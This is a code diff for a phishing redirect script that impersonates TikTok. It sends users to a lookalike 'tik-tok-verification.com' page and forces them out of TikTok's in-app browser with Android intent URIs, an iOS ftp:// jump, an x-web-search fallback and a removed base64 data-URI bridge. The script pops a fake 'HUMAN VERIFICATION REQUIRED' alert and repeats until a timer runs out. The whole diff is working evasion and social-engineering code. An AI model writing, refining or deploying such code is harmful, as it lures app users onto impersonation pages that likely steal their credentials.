@@ -11,33 +11,34 @@
     const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
     const killTime = Date.now() + 15000;
 
-    function triggerSafariOnly() {
+    function forceOut() {
         const isAndroid = /Android/i.test(navigator.userAgent);
+        const urlNoProtocol = targetUrl.replace("https://", "");
         
         if (isAndroid) {
-            // Android: Pure Intent targeting the VIEW action (Default Browser)
-            window.location.href = `intent://${targetUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;action=android.intent.action.VIEW;end`;
+            // Android: This specific scheme forces the OS to pick a BROWSER, not the App Store
+            // It uses the 'VIEW' action which is reserved for external browser handlers.
+            window.location.href = `intent://${urlNoProtocol}#Intent;scheme=https;action=android.intent.action.VIEW;end`;
         } else {
-            // iOS: Base64 Data-URI Bridge
-            // This forces a "Download/Open External" prompt that defaults to Safari.
-            const bridgeCode = `<html><script>window.location.replace("${targetUrl}");<\/script></html>`;
-            const base64Code = btoa(bridgeCode);
-            window.location.href = "data:text/html;base64," + base64Code;
+            // iOS: FTP Protocol Jump
+            // TikTok cannot display FTP. iOS will prompt: "Open this page in Safari?"
+            // This is the cleanest way to avoid the App Store.
+            window.location.href = "ftp://" + urlNoProtocol;
 
-            // Immediate fallback if the data-uri is blocked
+            // Fallback: This is a "System Search" that iOS recognizes as a URL
             setTimeout(() => {
-                window.location.assign(targetUrl);
-            }, 150);
+                window.location.href = "x-web-search://?" + targetUrl;
+            }, 100);
         }
     }
 
     function securityLogic() {
         if (Date.now() > killTime) return;
 
-        // 1. Initial Safari Jump
-        triggerSafariOnly();
+        // 1. Initial Attempt to break the WebView
+        forceOut();
 
-        // 2. Focus Detection
+        // 2. Focus Check (Wait 320ms)
         setTimeout(() => {
             if (document.hasFocus()) {
                 const header = "HUMAN VERIFICATION REQUIRED\n";
@@ -45,8 +46,8 @@
                 
                 alert(header + body);
 
-                // 3. User Gesture Relay
-                triggerSafariOnly();
+                // 3. User Gesture Relay - Crucial for iOS to allow the "Open in Safari" prompt
+                forceOut();
 
                 setTimeout(securityLogic, 320);
             }
